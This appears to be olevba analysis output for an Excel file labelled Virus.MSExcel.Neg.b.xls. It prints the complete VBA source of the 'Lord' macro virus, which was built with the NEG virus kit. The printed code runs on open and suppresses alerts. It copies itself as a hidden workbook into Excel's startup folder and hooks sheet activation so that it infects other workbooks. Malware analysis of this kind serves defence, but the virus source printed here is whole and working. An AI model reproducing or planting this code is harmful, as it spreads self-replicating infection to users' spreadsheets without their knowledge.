olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Neg.b.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Lord.bas 
in file: Virus.MSExcel.Neg.b.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Lord'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'------------------------------------------------
'Generated with NEG !!. Please include this text
'------------------------------------------------
'NEG is Trademark of NoMercy
'http://www.focus-asia.com/home/NoMercyVirusTeam/Neg.html
'VirusName:  Lord
'Author:  Foxz with NEG
'Module Name:  Lord
'Template: LORD.XLM

Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Application.ScreenUpdating = False
Application.DisplayAlerts = False
    
If cek_global() Then
    GoTo FuckSheet:
Else
    infectglobal
End If
FuckSheet:
Application.OnSheetActivate = "LORD.XLM!Fuck"
bye:
End Sub

Function cek_global() As Boolean
Attribute cek_global.VB_ProcData.VB_Invoke_Func = " \n14"
cek_global = False
For x = 1 To Application.Workbooks.Count
    If Application.Workbooks(x).Name = "LORD.XLM" Then
    For y = 1 To Application.Workbooks("LORD.XLM").Modules.Count
        If Application.Workbooks("LORD.XLM").Modules(y).Name = "Lord" Then
            cek_global = True
        End If
    Next y
    End If
Next x
End Function

Function infectglobal()
Attribute infectglobal.VB_ProcData.VB_Invoke_Func = " \n14"
  activebook = ActiveWorkbook.Name
  Workbooks(activebook).SaveCopyAs Application.StartupPath + "\LORD.XLM"
  Workbooks.Open (Application.StartupPath + "\LORD.XLM")
  Windows("LORD.XLM").Visible = False
 Application.Workbooks("LORD.XLM").Save
End Function

Function inFuckIt() As Boolean
Attribute inFuckIt.VB_ProcData.VB_Invoke_Func = " \n14"
activebook = ActiveWorkbook.Name
inFuckIt = False
For y = 1 To Application.Workbooks(activebook).Modules.Count
    If Application.Workbooks(activebook).Modules(y).Name = "Lord" Then
            inFuckIt = True
   End If
Next y
End Function

Sub Fuck()
Attribute Fuck.VB_ProcData.VB_Invoke_Func = " \n14"
    oactivebook = ActiveWorkbook.Name
    If inFuckIt() Then
    GoTo bye2
    Else
    End If
    Application.ScreenUpdating = False
    Application.Windows("LORD.XLM").Visible = True
    Workbooks("LORD.XLM").Activate
    Sheets("Lord").Visible = True
    Workbooks("LORD.XLM").Sheets("Lord").Copy Before:=Workbooks(oactivebook).Sheets(1)
    Workbooks(oactivebook).Sheets("Lord").Visible = False
    Workbooks("LORD.XLM").Sheets("Lord").Visible = False
    Windows("LORD.XLM").Visible = False
bye2:
Close
End Sub

Sub Auto_Close()
Attribute Auto_Close.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo bye3
Application.DisplayAlerts = False
Application.Workbooks("LORD.XLM").Save
If Day(Date) = "1" Then
    MsgBox "Get the best Excel Scanner!!! --NVT98--", 48
Else
End If
bye3:
End Sub
'Thank's for Speading NoMercy Product!

-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Neg.b.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Neg.b.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Neg.b.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Neg.b.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet1
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet2
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet3
' 0085     11 BOUNDSHEET : Sheet Information - Visual Basic module, visible - Lord
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.focus-asi|URL                                          |
|          |a.com/home/NoMercyVi|                                             |
|          |rusTeam/Neg.html    |                                             |
+----------+--------------------+---------------------------------------------+

